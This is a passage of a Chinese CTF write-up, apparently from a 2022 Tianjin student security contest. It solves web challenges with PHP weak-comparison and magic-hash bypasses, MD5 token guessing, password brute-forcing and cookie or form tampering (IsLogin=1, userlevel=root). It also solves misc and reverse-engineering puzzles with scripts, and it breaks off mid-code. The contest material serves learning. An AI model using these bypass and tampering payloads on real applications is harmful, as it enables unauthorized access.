class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先传一个json数据  json标准格式为<code>&#123;&quot;a&quot;:”sasd“,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code><br> is_numeric(@$x2[“x21”])?die(“ha?”):NULL;  这里必须不能是纯数字且要大于2017、怎么绕呢<br> is_numeric函数有一个特性，他会把<code>123asd</code>这种字符串改变为 123  也就是这也(‘1234a’ == 1234)为真，且因php中大于小于和==（两个等于）是不会判断类型是否相同这样的话，其为弱类型比较，我们传入一个大于2017的数加个字符串就行  如  200000aaa  <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;&#125;</code>这里注意  json值为字符串时要加双引号<br>还有一个x22  x22需要也是一个数组，且要等于2，count($x2[“x22”])!==2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">      <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">          <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>这里遍历x22这个数组，要求不能元素是有”XIPU”这个字样，但是还必须要在数组中能够找到。这里array_search()函数是存在弱类型比较的问题的，因此将第二个元素设置为0，在于”XIPU”字符串比较的时候，0==”XIPU”是成立的。因为xipu中没有数字，最后 <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;,&quot;x22&quot;:[[0],0]&#125;</code><br>第三部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。<br>x3不能为15562  且穿的值中要有XIPU,下面判断  15562的md5 的8-16 位要和我们传的数相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//45961dd50e46379442318098474e0ced</span></span><br><span class="line"><span class="comment">//0e46379442318098</span></span><br></pre></td></tr></table></figure><p>这里 又是老生长谈的问题   0e数字  且比较的时候为== 弱类型比较会把0e数字解析成科学计数法形式也就是0，那我们只需再找一个这样的数就行了<br>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">            j = md5_result[<span class="number">10</span>:<span class="number">24</span>]</span><br><span class="line">            <span class="comment">#isdigit()判断是否为纯数字，是则为true 反之false</span></span><br><span class="line">            <span class="keyword">if</span> j.isdigit():</span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br><span class="line"><span class="comment">#XIPU18570-----&gt;026cba5c0e20905432015695e9eb13ba</span></span><br><span class="line"><span class="comment">#47484XIPU-----&gt;373e838b0e191027496067472b89aa6b</span></span><br></pre></td></tr></table></figure><p>两个都可以<br>最终payload<code>index.php?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018asd&quot;,&quot;x22&quot;:[[0],0]&#125;&amp;x3=47484XIPU</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154508776.png" alt="image-20220930154508776"></p><h4 id="跳来跳去"><a href="#跳来跳去" class="headerlink" title="跳来跳去"></a>跳来跳去</h4><p>150pt (已做出) 简单越权<br>赛题地址<code>http://ctftime1.usaas.net/web/good/index.php</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154824375.png" alt="image-20220930154824375"><br>开局给了test test 直接登录<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155017429.png" alt="image-20220930155017429"><br>点这个登录成功会跳转到admin，且提示权限不足，显然要进行越权，抓个包<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155048535.png" alt="image-20220930155048535"><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155158626.png" alt="image-20220930155158626"><br>这边可以看到一个token，token=ad0234829205b9033196ba818f7a872b<br>显然是md5过的 解一下<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155257003.png" alt="image-20220930155257003"><br>这里为test2  我们这里肯定要admin的md5了,不过经过测试不是  admin的 也试了下admin2 也不是  果断爆破 ，其实是admin1的md5  啊这<br>爆破就不贴了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155701407.png" alt="image-20220930155701407"></p><h3 id="各种改header"><a href="#各种改header" class="headerlink" title="各种改header"></a>各种改header</h3><p>150pt (已做出) 考点：改包<br>开局一个黑框，我们这里直接往左上角看  有一个password.txt  那显然是爆破了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155942088.png" alt="image-20220930155942088"><br>访问之  直接复制，这里不用在生成密码字典文件了，直接可以粘贴一会看，随便在密码处输点什么然后抓包发送到intruder爆破<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160153027.png" alt="image-20220930160153027"><br>点clear 只加password这个字段的admin为变量，点paylaod，直接点paste就把刚刚在复制那边的密码粘贴<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160401337.png" alt="image-20220930160401337"><br>点attack开始就可以了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160618475.png" alt="image-20220930160618475"></p><p>密码为Nsf0cuS 时  回显了newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;解一下base64为：290bca70c7dae93db6644fa00b9d83b9.php<br>访问之<code>http://ctftime1.usaas.net/web/header/290bca70c7dae93db6644fa00b9d83b9.php</code><br>是一个留言板<br>随便输点什么<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161533441.png" alt="image-20220930161533441"></p><p>说我没登录  因为这里没有可登录的地方，果断抓包</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161712966.png" alt="image-20220930161712966"><br>这里IsLogin=0显然是判断登陆了没有直接改成1</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162050828.png" alt="image-20220930162050828"></p><p>然后又说我没有权限，我们看下面content=bohemian&amp;userlevel=guest&amp;Submit=%E7%95%99%E8%A8%80<br>userlevel 为guest 显然要改成管理员，比赛时试了<code>admin admin1 manager administrator</code> 都不是,果断爆破这个地方  最后是<code>root</code> 啊这</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162139612.png" alt="image-20220930162139612"><br><code>Flag=flag%7Bbbda40bfc4eff921a5f5faf0cfd3c195%7D</code><br><code>Flag=flag&#123;bbda40bfc4eff921a5f5faf0cfd3c195&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h3><p>开局给了一个附件，解压之是一个pdf 测了一测啥也没有，拖到winhex中看下十六进制</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930163312714.png" alt="image-20220930163312714"></p><p>往下拉一拉看到有插入的数据，在f 或者n后面是09 或者 20 并且都是八位</p><p>这样我们就可以想到  把09 20 转成 0或1   因为是八位  比如 01010101这个八位二进制可以转成10进制然后转ascii 这样就是字符了 </p><p>有了思路  开始做，这样的数据量  手撕显然是不行的，我们写脚本</p><p>先在winhex全选字符，右键-》edit-》copy block-》hex value</p><p>复制出来  然后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">alist = []</span><br><span class="line"><span class="comment">#line 为那一大串hex value值</span></span><br><span class="line">line = <span class="string">&quot;255044462D312E3520202009092020090D0A25B5B5B5B520202020202020200D0A312030206F626A0D0A3C3C2F547970652F436174616C6F672F50616765732032203020522F4C616E67287A682D434E&quot;</span></span><br><span class="line"><span class="comment"># 先把line两两字符一组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">alist.append(line[i:i+<span class="number">2</span>])</span><br><span class="line"><span class="comment">#判断每组的字符是不是09 或者20  并且  后面七位也必须是  09或20  因为中间可能会有09或20 扰乱我们截取</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)):</span><br><span class="line">    <span class="keyword">if</span> (alist[i] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">1</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">2</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">2</span>] == <span class="string">&quot;20&quot;</span> <span class="keyword">and</span> (alist[i+<span class="number">3</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">3</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">4</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">4</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">5</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">5</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">6</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">6</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">7</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">7</span>] == <span class="string">&quot;20&quot;</span>)):</span><br><span class="line">        s = alist[i]+alist[i+<span class="number">1</span>]+alist[i+<span class="number">2</span>]+alist[i+<span class="number">3</span>]+alist[i+<span class="number">4</span>]+alist[i+<span class="number">5</span>]+alist[i+<span class="number">6</span>]+alist[i+<span class="number">7</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#将09换成1    20换成0</span></span><br><span class="line">        s = s.replace(<span class="string">&quot;09&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        s = s.replace(<span class="string">&quot;20&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="comment"># 00011001</span></span><br><span class="line">        <span class="comment"># 00110010D</span></span><br><span class="line">        <span class="comment"># 0110010D0A</span></span><br><span class="line">        <span class="comment"># 0010D0A25B5B5</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A33</span></span><br><span class="line">        <span class="comment"># 01111000</span></span><br><span class="line">        <span class="comment"># x11110000D</span></span><br><span class="line">        <span class="comment"># 1110000D0A</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A35</span></span><br><span class="line">        <span class="comment"># 01100110</span></span><br><span class="line">        <span class="comment"># f001100D0A36</span></span><br><span class="line">        <span class="comment"># 01100D0A360</span></span><br><span class="line">        <span class="comment">#print(alist[i]+alist[i+1]+alist[i+2]+alist[i+3]+alist[i+4]+alist[i+5]+alist[i+6]+alist[i+7])</span></span><br><span class="line">        <span class="comment">#此时还是一个字符串   用split分割一下</span></span><br><span class="line">        s = s.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment">#判断出来小于8的字符 最后转ascii</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;=<span class="number">8</span>:</span><br><span class="line">                i=<span class="string">&#x27;0b&#x27;</span>+i                   </span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#txtflag&#123;EFAWEOFJ4TUW0Tgy&#125;</span></span><br></pre></td></tr></table></figure><p>emmm 这题150pt感觉有点亏比赛时没有解出来，时间太短了，后面复现的</p><h3 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h3><p>开局一个压缩包，是rar文件，解压有密码，通常来说伪加密一般都是zip这里应该不是伪加密，<br>foremost直接分离，也什么都没出来，我们直接strings梭<br>strings 可以将一个文件的hex数据中的可显字符输出出来</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164552419.png" alt="image-20220930164552419"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164817607.png" alt="image-20220930164817607"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164834081.png" alt="image-20220930164834081"><br>666C61677B4A7573745F65617379217DD<br>TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE<br>两个字符串，第一个显然是16进制，直接百度一个转一下<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165049824.png" alt="image-20220930165049824"><br><code>flag&#123;Just_easy!&#125;</code><br>这个字符串解出来是个假的 有兴趣的同学解一下</p><h3 id="未知的编码"><a href="#未知的编码" class="headerlink" title="未知的编码"></a>未知的编码</h3><p> <code>参考代码如下：&lt;div style=&quot;background-image:url(javascript:eval(String.fromCharCode(%66%6C%61%67%7B%64%34%38%65%31%61%34%64%2D%30%34%63%64%2D%34%62%36%34%2D%38%36%65%39%2D%37%37%66%38%66%35%31%32%39%36%30%35%7D)))&quot;&gt; </code><br>ascll你知道怎么解吗？<br>签到题，url解一下就可以了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165704813.png" alt="image-20220930165704813"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>不会，直接百度<br>参考<code>https://www.jianshu.com/p/7779f3e83384</code></p><h3 id="py逆向"><a href="#py逆向" class="headerlink" title="py逆向"></a>py逆向</h3><p>不是我做的，宇哥做的，我不会<br>参考宇哥的wp<br>题目给出源码  直接百度关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, seed, string</span>):</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> string:</span><br><span class="line">        rst.append((<span class="built_in">ord</span>(v) + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span>)</span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to python crackme&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    en_out = encrypt(KEY1, <span class="number">5</span>, flag)</span><br><span class="line">    <span class="keyword">if</span> KEY2 == en_out:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;You Win,FLAG IS flag&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try Again !&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接替换key2就行了<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 